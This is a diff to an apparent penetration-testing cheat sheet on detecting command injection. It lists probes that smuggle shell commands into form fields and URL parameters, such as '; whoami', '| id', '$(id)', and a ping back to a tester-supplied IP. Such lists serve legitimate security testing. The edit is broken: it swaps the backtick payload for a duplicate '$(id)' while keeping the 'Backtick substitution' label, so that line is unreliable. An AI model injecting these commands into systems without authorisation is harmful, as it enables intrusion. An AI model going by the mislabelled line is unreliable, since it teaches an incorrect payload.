@@ -1335,7 +1335,7 @@ Command Injection Detection (test in all form fields and URL params):
 ; whoami           ← Semicolon (chain commands)
 | id               ← Pipe (pass output)
 $(id)              ← Command substitution (bash)
-`id`               ← Backtick substitution
+$(id)             ← Backtick substitution
 && whoami          ← AND (execute if previous succeeds)
 || id              ← OR (execute if previous fails)
 ; ping -c 3 YOUR_IP  ← Confirm with: tcpdump -i eth0 icmp
